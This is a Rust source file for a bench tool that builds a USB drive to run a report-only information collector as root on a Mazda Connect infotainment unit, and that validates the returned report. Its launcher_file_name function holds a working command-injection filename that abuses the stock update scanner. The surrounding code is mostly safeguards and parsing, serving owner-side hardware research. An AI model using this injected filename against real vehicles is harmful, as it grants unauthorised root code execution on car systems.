//! Prepare a firmware-gated, report-only USB payload for a Mazda Connect CMU on an isolated bench.
//!
//! The Mac-side preparer writes only to an existing, otherwise empty destination directory. The
//! CMU-side payload is a fixed POSIX shell script embedded in this crate; it has no arbitrary path,
//! command, persistence, remount, reboot, VIP, CAN, or LIN options. The firmware gate runs inside
//! that payload, after the stock update scanner has already invoked it as root, so it cannot
//! validate or contain the entry mechanism itself.

use std::ffi::OsStr;
use std::fmt;
use std::fs;
#[cfg(any(target_os = "macos", test))]
use std::fs::OpenOptions;
#[cfg(any(target_os = "macos", test))]
use std::io::Write;
use std::io::{self, Read};
use std::path::{Path, PathBuf};

#[cfg(target_os = "macos")]
use std::path::Component;
#[cfg(target_os = "macos")]
use std::process::Command;

/// The one owner-visible car/firmware confirmation accepted by the USB preparer.
pub const TARGET_CONFIRMATION: &str = "cx5-2019.5-gt-70.00.100-na-n";

/// The exact owner-visible version expected on the target car's About screen.
pub const TARGET_DISPLAY_VERSION: &str = "70.00.100 NA N";

/// The normalized internal firmware identity accepted in a returned report.
pub const SUPPORTED_FIRMWARE: &str = "70.00.100A-NA";

/// The software part number published for the NA 70.00.100A build.
const SUPPORTED_SOFTWARE_PART_NUMBER: &str = "SWI10-24818-807R02";

#[cfg(any(target_os = "macos", test))]
const COLLECTOR_FILE_NAME: &str = "cmu-inspect.sh";
#[cfg(any(target_os = "macos", test))]
const UPDATE_FLAG_FILE_NAME: &str = "jci-autoupdate";
#[cfg(any(target_os = "macos", test))]
const STAGED_LAUNCHER_FILE_NAME: &str = ".cmu-launcher-stage";
#[cfg(any(target_os = "macos", test))]
const COLLECTOR: &[u8] = include_bytes!("../assets/cmu-inspect.sh");
const MAX_REPORT_FILE_BYTES: u64 = 1024 * 1024;
const MAX_CAPTURE_BYTES: u64 = 256 * 1024;
const REPORT_BUILD_ID: &str = "mazda-cmu-inspect-70.00.100-na-report-v2";

#[derive(Debug, Clone, Copy)]
struct ObservationSpec {
    source: &'static str,
    file: &'static str,
}

const OBSERVATIONS: [ObservationSpec; 17] = [
    ObservationSpec {
        source: "jci/version.ini",
        file: "firmware-version.ini",
    },
    ObservationSpec {
        source: "proc/sys/kernel/osrelease",
        file: "kernel-release.txt",
    },
    ObservationSpec {
        source: "proc/version",
        file: "kernel-version.txt",
    },
    ObservationSpec {
        source: "proc/cmdline",
        file: "kernel-command-line.txt",
    },
    ObservationSpec {
        source: "proc/cpuinfo",
        file: "cpuinfo.txt",
    },
    ObservationSpec {
        source: "proc/meminfo",
        file: "meminfo.txt",
    },
    ObservationSpec {
        source: "proc/mounts",
        file: "mounts.txt",
    },
    ObservationSpec {
        source: "proc/modules",
        file: "modules.txt",
    },
    ObservationSpec {
        source: "proc/config.gz",
        file: "kernel-config.gz",
    },
    ObservationSpec {
        source: "proc/partitions",
        file: "partitions.txt",
    },
    ObservationSpec {
        source: "proc/mtd",
        file: "mtd.txt",
    },
    ObservationSpec {
        source: "proc/bus/input/devices",
        file: "input-devices.txt",
    },
    ObservationSpec {
        source: "proc/bus/usb/devices",
        file: "usb-devices.txt",
    },
    ObservationSpec {
        source: "sys/class/graphics/fb0/name",
        file: "framebuffer-name.txt",
    },
    ObservationSpec {
        source: "sys/class/graphics/fb0/modes",
        file: "framebuffer-modes.txt",
    },
    ObservationSpec {
        source: "sys/class/drm/card0/device/uevent",
        file: "drm-device.txt",
    },
    ObservationSpec {
        source: "module-files/usb-network",
        file: "usb-network-modules.txt",
    },
];

/// An error encountered before or while preparing removable media.
#[derive(Debug)]
pub enum PrepareError {
    UnsupportedPlatform,
    UnsupportedFirmware,
    DestinationNotFound,
    DestinationIsSymlink,
    DestinationNotDirectory,
    DestinationTooBroad,
    DestinationOutsideMacVolumes,
    DestinationNotFat32,
    DestinationNotRemovable,
    DestinationNotMbr,
    DestinationInvalidDiskMetadata,
    DestinationNotFirstPartition,
    DestinationNotSinglePartition,
    DestinationNotEmpty(String),
    UnexpectedPostWriteEntry(String),
    PreparedPayloadMismatch(String),
    UnsafeMediaAfterFailedCleanup(Vec<String>),
    Io {
        action: &'static str,
        path: PathBuf,
        source: io::Error,
    },
}

impl fmt::Display for PrepareError {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::UnsupportedPlatform => write!(
                formatter,
                "prepare-usb is supported only on macOS; analyze-report remains cross-platform"
            ),
            Self::UnsupportedFirmware => write!(
                formatter,
                "target must be explicitly confirmed as {TARGET_CONFIRMATION} ({TARGET_DISPLAY_VERSION})"
            ),
            Self::DestinationNotFound => write!(formatter, "destination does not exist"),
            Self::DestinationIsSymlink => {
                write!(formatter, "destination must not be a symbolic link")
            }
            Self::DestinationNotDirectory => write!(formatter, "destination is not a directory"),
            Self::DestinationTooBroad => {
                write!(formatter, "refusing a filesystem root destination")
            }
            Self::DestinationOutsideMacVolumes => write!(
                formatter,
                "on macOS, destination must be a mounted volume root under /Volumes"
            ),
            Self::DestinationNotFat32 => {
                write!(formatter, "destination volume is not FAT32 (msdos)")
            }
            Self::DestinationNotRemovable => {
                write!(formatter, "destination volume is not removable media")
            }
            Self::DestinationNotMbr => {
                write!(formatter, "destination disk does not use an MBR partition map")
            }
            Self::DestinationInvalidDiskMetadata => write!(
                formatter,
                "diskutil returned incomplete or malformed volume metadata"
            ),
            Self::DestinationNotFirstPartition => write!(
                formatter,
                "destination volume must be the first partition (s1) of its parent disk"
            ),
            Self::DestinationNotSinglePartition => write!(
                formatter,
                "destination disk must contain exactly one partition, the selected FAT32 volume"
            ),
            Self::DestinationNotEmpty(name) => write!(
                formatter,
                "destination contains non-macOS-metadata entry {name:?}; use a blank FAT32 drive"
            ),
            Self::UnexpectedPostWriteEntry(name) => write!(
                formatter,
                "unexpected entry {name:?} appeared while preparing the drive"
            ),
            Self::PreparedPayloadMismatch(name) => write!(
                formatter,
                "prepared payload file {name:?} did not match the intended bytes"
            ),
            Self::UnsafeMediaAfterFailedCleanup(details) => write!(
                formatter,
                "Media may contain an active launcher; do not insert it into the vehicle. Reformat the entire device. Cleanup could not be verified: {}",
                details.join("; ")
            ),
            Self::Io {
                action,
                path,
                source,
            } => write!(formatter, "could not {action} {}: {source}", path.display()),
        }
    }
}

impl std::error::Error for PrepareError {
    fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {
        match self {
            Self::Io { source, .. } => Some(source),
            _ => None,
        }
    }
}

/// Evidence from a completed phase-one report that is relevant to a later USB-Ethernet probe.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ReportAnalysis {
    pub firmware: String,
    pub software_part_number: String,
    pub available_usb_network_drivers: Vec<UsbNetworkDriver>,
    pub usb_network_driver_files_status: ObservationStatus,
    pub loaded_usb_network_modules: Vec<String>,
    pub loaded_usb_network_modules_status: ObservationStatus,
}

/// USB-network driver families relevant to a host-safe Mac transport.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum UsbNetworkDriver {
    Asix,
    CdcEther,
    CdcNcm,
}

/// Manifest status retained for an observation used by the report summary.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ObservationStatus {
    Ok,
    Truncated,
    NotFound,
    NotRegularFile,
    PermissionDenied,
    DependencyFailed,
}

impl ObservationStatus {
    /// Returns the exact status spelling used by the report manifest.
    #[must_use]
    pub const fn as_str(self) -> &'static str {
        match self {
            Self::Ok => "ok",
            Self::Truncated => "truncated",
            Self::NotFound => "not_found",
            Self::NotRegularFile => "not_regular_file",
            Self::PermissionDenied => "permission_denied",
            Self::DependencyFailed => "dependency_failed",
        }
    }

    /// Whether the observation was complete enough to support a `none found` conclusion.
    #[must_use]
    pub const fn is_complete(self) -> bool {
        matches!(self, Self::Ok)
    }
}

impl fmt::Display for ObservationStatus {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter.write_str(self.as_str())
    }
}

impl ReportAnalysis {
    /// Whether the exact running-kernel report contains USB-network compatibility evidence.
    ///
    /// This does not authorize inserting an adapter, loading a module, or configuring an
    /// interface. USB insertion itself may trigger hotplug, module loading, configuration, and
    /// stock logging.
    #[must_use]
    pub const fn has_usb_network_compatibility_evidence(&self) -> bool {
        !self.available_usb_network_drivers.is_empty()
    }
}

/// An error encountered while validating a report copied back to the Mac.
#[derive(Debug)]
pub enum AnalyzeError {
    ReportNotFound,
    ReportNotDirectory,
    MissingFile(&'static str),
    OversizedFile(&'static str),
    InvalidFileType(&'static str),
    UnexpectedFile(String),
    InvalidSchema,
    InvalidObservation(&'static str),
    MalformedTextObservation(&'static str),
    ObservationFailed {
        source: &'static str,
        status: &'static str,
    },
    ChecksumMismatch(&'static str),
    IncompleteReport,
    UnsupportedFirmware(String),
    Io {
        action: &'static str,
        path: PathBuf,
        source: io::Error,
    },
}

impl fmt::Display for AnalyzeError {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::ReportNotFound => write!(formatter, "report directory does not exist"),
            Self::ReportNotDirectory => write!(formatter, "report path is not a directory"),
            Self::MissingFile(name) => write!(formatter, "report is missing {name}"),
            Self::OversizedFile(name) => write!(formatter, "report file {name} exceeds 1 MiB"),
            Self::InvalidFileType(name) => {
                write!(formatter, "report file {name} is not a regular file")
            }
            Self::UnexpectedFile(name) => {
                write!(formatter, "report contains unexpected file {name:?}")
            }
            Self::InvalidSchema => write!(formatter, "report manifest schema is not supported"),
            Self::InvalidObservation(source) => {
                write!(formatter, "manifest record for {source} is invalid")
            }
            Self::MalformedTextObservation(source) => write!(
                formatter,
                "CMU observation {source} malformed: successful textual capture is not UTF-8"
            ),
            Self::ObservationFailed { source, status } => {
                write!(formatter, "CMU observation {source} failed with {status}")
            }
            Self::ChecksumMismatch(name) => {
                write!(
                    formatter,
                    "report file {name} does not match its manifest checksum"
                )
            }
            Self::IncompleteReport => {
                write!(formatter, "report is missing its successful-flush marker")
            }
            Self::UnsupportedFirmware(firmware) => write!(
                formatter,
                "report is from unsupported firmware {firmware:?}, expected {SUPPORTED_FIRMWARE} with software part {SUPPORTED_SOFTWARE_PART_NUMBER}"
            ),
            Self::Io {
                action,
                path,
                source,
            } => write!(formatter, "could not {action} {}: {source}", path.display()),
        }
    }
}

impl std::error::Error for AnalyzeError {
    fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {
        match self {
            Self::Io { source, .. } => Some(source),
            _ => None,
        }
    }
}

/// Writes the three-file report payload into an existing blank removable-media directory.
///
/// `confirmed_target` must exactly match [`TARGET_CONFIRMATION`]. Existing files are never
/// overwritten. The active launcher name is installed only by the final atomic rename. If a later
/// validation fails, the original error is returned only after cleanup is verified.
///
/// # Errors
///
/// Returns an error when the firmware was not explicitly confirmed, the destination is unsafe or
/// non-empty, or any payload file cannot be created and flushed.
#[cfg(target_os = "macos")]
pub fn prepare_usb(destination: &Path, confirmed_target: &str) -> Result<(), PrepareError> {
    if confirmed_target != TARGET_CONFIRMATION {
        return Err(PrepareError::UnsupportedFirmware);
    }

    verify_macos_volume(destination)?;
    prepare_payload_files(destination)
}

/// Refuses to prepare executable media on platforms where the macOS volume checks are unavailable.
///
/// # Errors
///
/// Always returns [`PrepareError::UnsupportedPlatform`] without inspecting or writing the path.
#[cfg(not(target_os = "macos"))]
pub fn prepare_usb(_destination: &Path, _confirmed_target: &str) -> Result<(), PrepareError> {
    Err(PrepareError::UnsupportedPlatform)
}

#[cfg(any(target_os = "macos", test))]
fn prepare_payload_files(destination: &Path) -> Result<(), PrepareError> {
    validate_payload_destination(destination)?;

    let active_launcher_name = launcher_file_name();
    let safe_payloads: [(&str, &[u8]); 2] = [
        (COLLECTOR_FILE_NAME, COLLECTOR),
        (UPDATE_FLAG_FILE_NAME, b"\n"),
    ];
    for &(name, content) in &safe_payloads {
        let path = destination.join(name);
        if let Err(error) = create_new_file(&path, content) {
            let preparation_error = io_error("create payload file", &path, error);
            return Err(error_after_verified_cleanup(
                destination,
                &active_launcher_name,
                preparation_error,
            ));
        }
        if let Err(error) = verify_payload_file(destination, name, content) {
            return Err(error_after_verified_cleanup(
                destination,
                &active_launcher_name,
                error,
            ));
        }
    }

    prepare_staged_launcher(destination, &active_launcher_name)?;

    let active_payloads: [(&str, &[u8]); 3] = [
        (COLLECTOR_FILE_NAME, COLLECTOR),
        (UPDATE_FLAG_FILE_NAME, b"\n"),
        (&active_launcher_name, b"\n"),
    ];
    if let Err(error) = verify_prepared_entries(destination, &active_payloads) {
        return Err(error_after_verified_cleanup(
            destination,
            &active_launcher_name,
            error,
        ));
    }

    Ok(())
}

#[cfg(any(target_os = "macos", test))]
fn validate_payload_destination(destination: &Path) -> Result<(), PrepareError> {
    let metadata = fs::symlink_metadata(destination).map_err(|error| {
        if error.kind() == io::ErrorKind::NotFound {
            PrepareError::DestinationNotFound
        } else {
            io_error("inspect", destination, error)
        }
    })?;
    if metadata.file_type().is_symlink() {
        return Err(PrepareError::DestinationIsSymlink);
    }
    if !metadata.is_dir() {
        return Err(PrepareError::DestinationNotDirectory);
    }
    if destination.parent().is_none() {
        return Err(PrepareError::DestinationTooBroad);
    }

    let entries =
        fs::read_dir(destination).map_err(|error| io_error("list", destination, error))?;
    for entry in entries {
        let entry = entry.map_err(|error| io_error("list", destination, error))?;
        if !is_ignorable_macos_metadata(&entry.file_name()) {
            return Err(PrepareError::DestinationNotEmpty(
                entry.file_name().to_string_lossy().into_owned(),
            ));
        }
    }

    Ok(())
}

#[cfg(any(target_os = "macos", test))]
fn prepare_staged_launcher(
    destination: &Path,
    active_launcher_name: &str,
) -> Result<(), PrepareError> {
    let staged_launcher_path = destination.join(STAGED_LAUNCHER_FILE_NAME);
    if let Err(error) = create_new_file(&staged_launcher_path, b"\n") {
        let preparation_error =
            io_error("create inert launcher stage", &staged_launcher_path, error);
        return Err(error_after_verified_cleanup(
            destination,
            active_launcher_name,
            preparation_error,
        ));
    }
    if let Err(error) = verify_payload_file(destination, STAGED_LAUNCHER_FILE_NAME, b"\n") {
        return Err(error_after_verified_cleanup(
            destination,
            active_launcher_name,
            error,
        ));
    }

    let staged_payloads: [(&str, &[u8]); 3] = [
        (COLLECTOR_FILE_NAME, COLLECTOR),
        (UPDATE_FLAG_FILE_NAME, b"\n"),
        (STAGED_LAUNCHER_FILE_NAME, b"\n"),
    ];
    if let Err(error) = verify_prepared_entries(destination, &staged_payloads) {
        return Err(error_after_verified_cleanup(
            destination,
            active_launcher_name,
            error,
        ));
    }

    let active_launcher_path = destination.join(active_launcher_name);
    if let Err(error) = fs::rename(&staged_launcher_path, &active_launcher_path) {
        let preparation_error =
            io_error("atomically activate launcher", &active_launcher_path, error);
        return Err(error_after_verified_cleanup(
            destination,
            active_launcher_name,
            preparation_error,
        ));
    }

    Ok(())
}

#[cfg(any(target_os = "macos", test))]
fn verify_prepared_entries(
    destination: &Path,
    payloads: &[(&str, &[u8])],
) -> Result<(), PrepareError> {
    let entries = fs::read_dir(destination)
        .map_err(|error| io_error("verify prepared drive", destination, error))?;
    for entry in entries {
        let entry = entry.map_err(|error| io_error("verify prepared drive", destination, error))?;
        let name = entry.file_name();
        let is_payload = payloads
            .iter()
            .any(|(payload_name, _)| name == OsStr::new(payload_name));
        if !is_payload && !is_ignorable_macos_metadata(&name) {
            return Err(PrepareError::UnexpectedPostWriteEntry(
                name.to_string_lossy().into_owned(),
            ));
        }
    }
    for &(name, expected) in payloads {
        verify_payload_file(destination, name, expected)?;
    }
    Ok(())
}

#[cfg(any(target_os = "macos", test))]
fn verify_payload_file(
    destination: &Path,
    name: &str,
    expected: &[u8],
) -> Result<(), PrepareError> {
    let path = destination.join(name);
    let metadata = fs::symlink_metadata(&path)
        .map_err(|error| io_error("verify payload file", &path, error))?;
    if metadata.file_type().is_symlink()
        || !metadata.is_file()
        || metadata.len() != u64::try_from(expected.len()).expect("payload length fits in u64")
    {
        return Err(PrepareError::PreparedPayloadMismatch(name.to_owned()));
    }
    let mut actual = Vec::with_capacity(expected.len() + 1);
    fs::File::open(&path)
        .map_err(|error| io_error("open payload for verification", &path, error))?
        .take(u64::try_from(expected.len()).expect("payload length fits in u64") + 1)
        .read_to_end(&mut actual)
        .map_err(|error| io_error("read payload for verification", &path, error))?;
    if actual != expected {
        return Err(PrepareError::PreparedPayloadMismatch(name.to_owned()));
    }
    Ok(())
}

/// Builds the one command-injection filename used by the vulnerable Gen-6.5 update scanner.
///
/// This implementation is independently derived from ZDI's published filename-injection
/// primitive. FAT disallows a literal `/`, so standard shell built-ins derive `/` by moving from
/// `HOME` to its parent. This target-specific launcher names only the documented first-drive mount
/// and contains no mount selection, mount-search loop, or arbitrary command input. The launcher is
/// necessarily evaluated before the collector can check firmware and is therefore bench-only.
#[must_use]
pub fn launcher_file_name() -> String {
    "$(R=$(cd ${HOME};cd ..;pwd);sh ${R}tmp${R}mnt${R}sda1${R}cmu-inspect.sh).up".to_owned()
}

/// Validates and analyzes a completed `mazda-cmu-report` directory.
///
/// The analyzer is read-only and caps every report file at 1 MiB before reading it. A positive
/// transport result is compatibility evidence only, not permission to insert hardware or alter
/// CMU networking.
///
/// # Errors
///
/// Returns an error when the report is missing, malformed, incomplete, oversized, unreadable, or
/// from any firmware other than [`SUPPORTED_FIRMWARE`].
pub fn analyze_report(report_directory: &Path) -> Result<ReportAnalysis, AnalyzeError> {
    let metadata = fs::metadata(report_directory).map_err(|error| {
        if error.kind() == io::ErrorKind::NotFound {
            AnalyzeError::ReportNotFound
        } else {
            analyze_io_error("inspect", report_directory, error)
        }
    })?;
    if !metadata.is_dir() {
        return Err(AnalyzeError::ReportNotDirectory);
    }

    let manifest_bytes = read_required_report_bytes(report_directory, "manifest.tsv")?;
    let manifest = std::str::from_utf8(&manifest_bytes).map_err(|_| AnalyzeError::InvalidSchema)?;
    let mut manifest_lines = manifest.lines();
    let expected_build_line = format!("build\t{REPORT_BUILD_ID}");
    if manifest_lines.next() != Some("mazda-cmu-report\t3")
        || manifest_lines.next() != Some(expected_build_line.as_str())
        || manifest_lines.next() != Some("source\tstatus\tbytes\tcksum\tfile")
    {
        return Err(AnalyzeError::InvalidSchema);
    }

    let mut observations = Vec::with_capacity(OBSERVATIONS.len());
    for spec in OBSERVATIONS {
        let line = manifest_lines
            .next()
            .ok_or(AnalyzeError::InvalidObservation(spec.source))?;
        observations.push(validate_observation(report_directory, spec, line)?);
    }
    if manifest_lines.next() != Some("integrity\tcomplete") || manifest_lines.next().is_some() {
        return Err(AnalyzeError::InvalidSchema);
    }

    let flush_marker_path = report_directory.join("flush-complete");
    if !flush_marker_path.exists() {
        return Err(AnalyzeError::IncompleteReport);
    }
    let flush_marker = read_report_file(&flush_marker_path, "flush-complete")?;
    if flush_marker != format!("flush\tcomplete\nbuild\t{REPORT_BUILD_ID}\n").as_bytes() {
        return Err(AnalyzeError::IncompleteReport);
    }

    validate_report_entries(report_directory, &observations)?;

    let firmware_file = observation_text(&observations, 0)?;
    let firmware_identity =
        FirmwareIdentity::parse(firmware_file).ok_or(AnalyzeError::InvalidSchema)?;
    let firmware = firmware_identity.normalized_firmware();
    if !firmware_identity.is_supported() {
        return Err(AnalyzeError::UnsupportedFirmware(
            firmware_identity.description(),
        ));
    }

    let kernel_release = observation_text(&observations, 1)?.trim();
    if kernel_release.is_empty()
        || !kernel_release
            .chars()
            .all(|character| character.is_ascii_alphanumeric() || "._+-".contains(character))
    {
        return Err(AnalyzeError::InvalidObservation(
            "proc/sys/kernel/osrelease",
        ));
    }
    let module_files_observation = observations.get(16).ok_or(AnalyzeError::InvalidSchema)?;
    let module_files = optional_observation_text(module_files_observation)?;
    if let Some(module_files) = module_files {
        validate_module_file_list(module_files, kernel_release)?;
    }
    let loaded_modules_observation = observations.get(7).ok_or(AnalyzeError::InvalidSchema)?;
    let loaded_modules = optional_observation_text(loaded_modules_observation)?;
    let module_files_text = module_files.unwrap_or_default();
    let loaded_modules_text = loaded_modules.unwrap_or_default();

    let mut available_usb_network_drivers = Vec::new();
    for (module, driver) in [
        ("asix", UsbNetworkDriver::Asix),
        ("cdc_ether", UsbNetworkDriver::CdcEther),
        ("cdc_ncm", UsbNetworkDriver::CdcNcm),
    ] {
        if module_is_available(module_files_text, loaded_modules_text, module) {
            available_usb_network_drivers.push(driver);
        }
    }

    Ok(ReportAnalysis {
        firmware,
        software_part_number: firmware_identity.software_part_number.to_owned(),
        available_usb_network_drivers,
        usb_network_driver_files_status: module_files_observation.status,
        loaded_usb_network_modules: parse_loaded_usb_network_modules(loaded_modules_text),
        loaded_usb_network_modules_status: loaded_modules_observation.status,
    })
}

#[cfg(any(target_os = "macos", test))]
fn create_new_file(path: &Path, content: &[u8]) -> io::Result<()> {
    let mut file = OpenOptions::new().write(true).create_new(true).open(path)?;
    file.write_all(content)?;
    file.sync_all()
}

#[cfg(any(target_os = "macos", test))]
fn error_after_verified_cleanup(
    destination: &Path,
    active_launcher_name: &str,
    preparation_error: PrepareError,
) -> PrepareError {
    match remove_and_verify_payload_absence(destination, active_launcher_name) {
        Ok(()) => preparation_error,
        Err(cleanup_error) => cleanup_error,
    }
}

#[cfg(any(target_os = "macos", test))]
fn remove_and_verify_payload_absence(
    destination: &Path,
    active_launcher_name: &str,
) -> Result<(), PrepareError> {
    let payload_names = cleanup_payload_names(active_launcher_name);
    let mut failures = Vec::new();

    for name in payload_names.iter().rev() {
        let path = destination.join(name);
        if let Err(error) = fs::remove_file(&path) {
            if error.kind() != io::ErrorKind::NotFound {
                failures.push(format!("could not remove {}: {error}", path.display()));
            }
        }
    }

    match fs::read_dir(destination) {
        Ok(entries) => {
            for entry in entries {
                match entry {
                    Ok(entry) => {
                        if payload_names
                            .iter()
                            .any(|name| entry.file_name() == OsStr::new(name))
                        {
                            failures
                                .push(format!("payload name remains: {}", entry.path().display()));
                        }
                    }
                    Err(error) => failures.push(format!(
                        "could not inspect an entry while verifying cleanup: {error}"
                    )),
                }
            }
        }
        Err(error) => failures.push(format!(
            "could not re-list {} after cleanup: {error}",
            destination.display()
        )),
    }

    if failures.is_empty() {
        Ok(())
    } else {
        Err(PrepareError::UnsafeMediaAfterFailedCleanup(failures))
    }
}

#[cfg(any(target_os = "macos", test))]
fn cleanup_payload_names(active_launcher_name: &str) -> Vec<String> {
    let base_names = [
        COLLECTOR_FILE_NAME,
        UPDATE_FLAG_FILE_NAME,
        STAGED_LAUNCHER_FILE_NAME,
        active_launcher_name,
    ];
    let mut names = Vec::with_capacity(base_names.len() * 2);
    for name in base_names {
        names.push(name.to_owned());
        names.push(format!("._{name}"));
    }
    names
}

#[cfg(any(target_os = "macos", test))]
fn is_ignorable_macos_metadata(name: &OsStr) -> bool {
    matches!(
        name.to_str(),
        Some(".fseventsd" | ".Spotlight-V100" | ".Trashes")
    )
}

#[cfg(any(target_os = "macos", test))]
fn io_error(action: &'static str, path: &Path, source: io::Error) -> PrepareError {
    PrepareError::Io {
        action,
        path: path.to_owned(),
        source,
    }
}

fn analyze_io_error(action: &'static str, path: &Path, source: io::Error) -> AnalyzeError {
    AnalyzeError::Io {
        action,
        path: path.to_owned(),
        source,
    }
}

#[derive(Debug)]
struct Observation {
    spec: ObservationSpec,
    status: ObservationStatus,
    content: Option<Vec<u8>>,
}

fn validate_observation(
    report_directory: &Path,
    spec: ObservationSpec,
    manifest_line: &str,
) -> Result<Observation, AnalyzeError> {
    let fields = manifest_line.split('\t').collect::<Vec<_>>();
    if fields.len() != 5 || fields[0] != spec.source {
        return Err(AnalyzeError::InvalidObservation(spec.source));
    }

    let status = fields[1];
    let bytes = fields[2]
        .parse::<u64>()
        .map_err(|_| AnalyzeError::InvalidObservation(spec.source))?;
    if matches!(status, "timeout" | "io_error") {
        if bytes == 0 && fields[3] == "-" && fields[4] == "-" {
            return Err(AnalyzeError::ObservationFailed {
                source: spec.source,
                status: if status == "timeout" {
                    "timeout"
                } else {
                    "io_error"
                },
            });
        }
        return Err(AnalyzeError::InvalidObservation(spec.source));
    }
    if matches!(status, "ok" | "truncated") {
        if fields[4] != spec.file
            || bytes > MAX_CAPTURE_BYTES
            || (status == "truncated" && bytes != MAX_CAPTURE_BYTES)
        {
            return Err(AnalyzeError::InvalidObservation(spec.source));
        }
        let expected_checksum = fields[3]
            .parse::<u32>()
            .map_err(|_| AnalyzeError::InvalidObservation(spec.source))?;
        let content = read_required_report_bytes(report_directory, spec.file)?;
        if u64::try_from(content.len()).expect("capture length fits in u64") != bytes
            || posix_cksum(&content) != expected_checksum
        {
            return Err(AnalyzeError::ChecksumMismatch(spec.file));
        }
        Ok(Observation {
            spec,
            status: if status == "ok" {
                ObservationStatus::Ok
            } else {
                ObservationStatus::Truncated
            },
            content: Some(content),
        })
    } else if matches!(
        status,
        "not_found" | "not_regular_file" | "permission_denied" | "dependency_failed"
    ) && bytes == 0
        && fields[3] == "-"
        && fields[4] == "-"
    {
        Ok(Observation {
            spec,
            status: match status {
                "not_found" => ObservationStatus::NotFound,
                "not_regular_file" => ObservationStatus::NotRegularFile,
                "permission_denied" => ObservationStatus::PermissionDenied,
                "dependency_failed" => ObservationStatus::DependencyFailed,
                _ => unreachable!("status was matched above"),
            },
            content: None,
        })
    } else {
        Err(AnalyzeError::InvalidObservation(spec.source))
    }
}

fn validate_report_entries(
    report_directory: &Path,
    observations: &[Observation],
) -> Result<(), AnalyzeError> {
    let entries = fs::read_dir(report_directory)
        .map_err(|error| analyze_io_error("list", report_directory, error))?;
    for entry in entries {
        let entry = entry.map_err(|error| analyze_io_error("list", report_directory, error))?;
        let name = entry.file_name();
        let allowed = matches!(name.to_str(), Some("manifest.tsv" | "flush-complete"))
            || observations.iter().any(|observation| {
                observation.content.is_some() && name == OsStr::new(observation.spec.file)
            });
        if !allowed {
            return Err(AnalyzeError::UnexpectedFile(
                name.to_string_lossy().into_owned(),
            ));
        }
    }
    Ok(())
}

fn observation_text(observations: &[Observation], index: usize) -> Result<&str, AnalyzeError> {
    let observation = observations.get(index).ok_or(AnalyzeError::InvalidSchema)?;
    let content = observation
        .content
        .as_deref()
        .ok_or(AnalyzeError::InvalidObservation(observation.spec.source))?;
    std::str::from_utf8(content)
        .map_err(|_| AnalyzeError::MalformedTextObservation(observation.spec.source))
}

fn optional_observation_text(observation: &Observation) -> Result<Option<&str>, AnalyzeError> {
    observation
        .content
        .as_deref()
        .map(|content| {
            std::str::from_utf8(content)
                .map_err(|_| AnalyzeError::MalformedTextObservation(observation.spec.source))
        })
        .transpose()
}

fn read_required_report_bytes(
    report_directory: &Path,
    name: &'static str,
) -> Result<Vec<u8>, AnalyzeError> {
    let path = report_directory.join(name);
    if !path.exists() {
        return Err(AnalyzeError::MissingFile(name));
    }
    read_report_file(&path, name)
}

fn read_report_file(path: &Path, name: &'static str) -> Result<Vec<u8>, AnalyzeError> {
    let metadata =
        fs::symlink_metadata(path).map_err(|error| analyze_io_error("inspect", path, error))?;
    if !metadata.is_file() || metadata.file_type().is_symlink() {
        return Err(AnalyzeError::InvalidFileType(name));
    }
    if metadata.len() > MAX_REPORT_FILE_BYTES {
        return Err(AnalyzeError::OversizedFile(name));
    }

    let file = fs::File::open(path).map_err(|error| analyze_io_error("open", path, error))?;
    let mut bytes = Vec::new();
    file.take(MAX_REPORT_FILE_BYTES + 1)
        .read_to_end(&mut bytes)
        .map_err(|error| analyze_io_error("read", path, error))?;
    if u64::try_from(bytes.len()).expect("report byte count fits in u64") > MAX_REPORT_FILE_BYTES {
        return Err(AnalyzeError::OversizedFile(name));
    }

    Ok(bytes)
}

#[derive(Debug)]
struct FirmwareIdentity<'a> {
    version: String,
    patch: String,
    flavor: String,
    software_part_number: &'a str,
}

impl<'a> FirmwareIdentity<'a> {
    fn parse(version_file: &'a str) -> Option<Self> {
        let version = unique_quoted_ini_value(version_file, "JCI_SW_VER")?.to_owned();
        let patch = unique_quoted_ini_value(version_file, "JCI_SW_VER_PATCH")?.to_owned();
        let flavor = unique_quoted_ini_value(version_file, "JCI_SW_FLAVOR")?.to_owned();
        let software_part_number = unique_quoted_ini_value(version_file, "JCI_SW_PART_NUMBER")?;

        Some(Self {
            version,
            patch,
            flavor,
            software_part_number,
        })
    }

    fn is_supported(&self) -> bool {
        self.version == "MAZ_CMU-150_70.00.100"
            && self.patch == "A"
            && self.flavor == "NA"
            && self.software_part_number == SUPPORTED_SOFTWARE_PART_NUMBER
    }

    fn normalized_firmware(&self) -> String {
        let mut version = self
            .version
            .strip_prefix("MAZ_CMU-150_")
            .unwrap_or(&self.version)
            .to_owned();
        if !self.patch.is_empty() && !version.ends_with(&self.patch) {
            version.push_str(&self.patch);
        }
        format!("{version}-{}", self.flavor)
    }

    fn description(&self) -> String {
        format!(
            "{} (software part {})",
            self.normalized_firmware(),
            self.software_part_number
        )
    }
}

fn unique_quoted_ini_value<'a>(version_file: &'a str, key: &str) -> Option<&'a str> {
    let mut values = version_file.lines().filter_map(|line| {
        let line = line.trim_end_matches('\r');
        let (candidate_key, value) = line.split_once('=')?;
        (candidate_key == key).then_some(value)
    });
    let value = values.next()?;
    if values.next().is_some() {
        return None;
    }
    value.strip_prefix('"')?.strip_suffix('"')
}

fn validate_module_file_list(module_files: &str, kernel_release: &str) -> Result<(), AnalyzeError> {
    let prefix = format!("lib/modules/{kernel_release}/kernel/drivers/net/usb/");
    for line in module_files.lines() {
        let file_name = line
            .strip_prefix(&prefix)
            .ok_or(AnalyzeError::InvalidObservation("module-files/usb-network"))?;
        if file_name.is_empty()
            || file_name.contains('/')
            || !file_name
                .chars()
                .all(|character| character.is_ascii_alphanumeric() || "._+-".contains(character))
            || !matches!(file_name.rsplit_once(".ko"), Some((_, "" | ".gz" | ".xz")))
        {
            return Err(AnalyzeError::InvalidObservation("module-files/usb-network"));
        }
    }
    Ok(())
}

